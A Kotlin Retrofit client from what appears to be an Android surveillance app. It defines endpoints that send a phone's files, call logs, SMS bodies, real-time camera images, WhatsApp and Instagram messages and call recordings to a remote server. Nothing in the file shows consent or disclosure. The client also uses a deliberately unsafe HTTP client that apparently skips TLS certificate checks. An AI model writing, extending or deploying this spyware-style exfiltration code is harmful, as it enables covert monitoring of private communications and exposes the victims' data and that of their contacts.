package com.example.bullsseeclient.api

import com.example.bullsseeclient.HttpClient
import com.google.gson.annotations.SerializedName
import okhttp3.MultipartBody
import okhttp3.RequestBody
import retrofit2.Call
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.Body
import retrofit2.http.GET
import retrofit2.http.Multipart
import retrofit2.http.POST
import retrofit2.http.Part

// ==========================================
// Data Transfer Objects (DTOs)
// ==========================================

/**
 * DTO for device registration.
 * Endpoint: api/DeviceData/device-register
 */
data class DeviceDto(
    @SerializedName("deviceName") val deviceName: String?,
    @SerializedName("model") val model: String?,
    @SerializedName("osVersion") val osVersion: String?,
    @SerializedName("lastUpdated") val lastUpdated: Long
)

/**
 * DTO for file uploads (Images, Videos, Documents).
 * Endpoints: api/DeviceData/image-list, video-list, file-list
 */
data class FileDto(
    @SerializedName("path") val path: String,
    @SerializedName("name") val name: String,
    @SerializedName("size") val size: Long,
    @SerializedName("lastModified") val lastModified: String,
    @SerializedName("content") val content: String?
)

/**
 * DTO for Call Logs.
 * Endpoint: api/DeviceData/calllog
 */
data class CallDto(
    @SerializedName("Number") val number: String?,
    @SerializedName("Date") val date: String,
    @SerializedName("Type") val type: String,
    @SerializedName("Duration") val duration: Int?
)

/**
 * DTO for SMS Logs.
 * Endpoint: api/DeviceData/smslog
 */
data class SmsDto(
    @SerializedName("Address") val address: String?,
    @SerializedName("Body") val body: String?,
    @SerializedName("Type") val type: String,
    @SerializedName("Date") val date: String
)

/**
 * DTO for Camera Images (Real-time).
 * Endpoint: api/DeviceData/cameraImage
 */
data class ImageDto(
    @SerializedName("base64Image") val base64Image: String,
    @SerializedName("timestamp") val timestamp: String
)

/**
 * DTO for Social Media Messages (WhatsApp, Instagram).
 * Endpoint: api/DeviceData/appMessage
 */
data class AppMsgDto(
    @SerializedName("App") val app: String,
    @SerializedName("Body") val body: String,
    @SerializedName("Type") val type: String,
    @SerializedName("Date") val date: String
)

// ==========================================
// API Interface
// ==========================================

interface ApiService {

    // --- Device Registration ---
    @POST("api/DeviceData/device-register")
    fun registerDevice(@Body device: DeviceDto): Call<Void>

    // --- File Uploads ---
    @POST("api/DeviceData/image-list")
    fun sendImages(@Body files: List<FileDto>): Call<Void>

    @POST("api/DeviceData/video-list")
    fun sendVideos(@Body files: List<FileDto>): Call<Void>

    @POST("api/DeviceData/file-list")
    fun sendFiles(@Body files: List<FileDto>): Call<Void>

    @GET("api/DeviceData/all-files")
    fun getAllFiles(): Call<List<FileDto>>

    // --- Logs & Events ---
    @POST("api/DeviceData/calllog")
    fun sendCallLogs(@Body logs: List<CallDto>): Call<Void>

    @POST("api/DeviceData/smslog")
    fun sendSmsLogs(@Body logs: List<SmsDto>): Call<Void>

    @POST("api/DeviceData/cameraImage")
    fun sendCameraImages(@Body images: List<ImageDto>): Call<Void>

    @POST("api/DeviceData/appMessage")
    fun sendAppMessage(@Body message: AppMsgDto): Call<Void>

    // --- Call Recording (Multipart) ---
    @Multipart
    @POST("api/DeviceData/callRecording")
    fun sendCallRecording(
        @Part file: MultipartBody.Part,
        @Part("Number") number: RequestBody,
        @Part("Type") type: RequestBody,
        @Part("Date") date: RequestBody,
        @Part("Duration") duration: RequestBody
    ): Call<Void>
}

// ==========================================
// Singleton API Client
// ==========================================

object ApiClient {
    val api: ApiService by lazy {
        Retrofit.Builder()
            .baseUrl(HttpClient.BASE_URL)
            .addConverterFactory(GsonConverterFactory.create())
            .client(HttpClient.getUnsafeOkHttpClient())
            .build()
            .create(ApiService::class.java)
    }
}
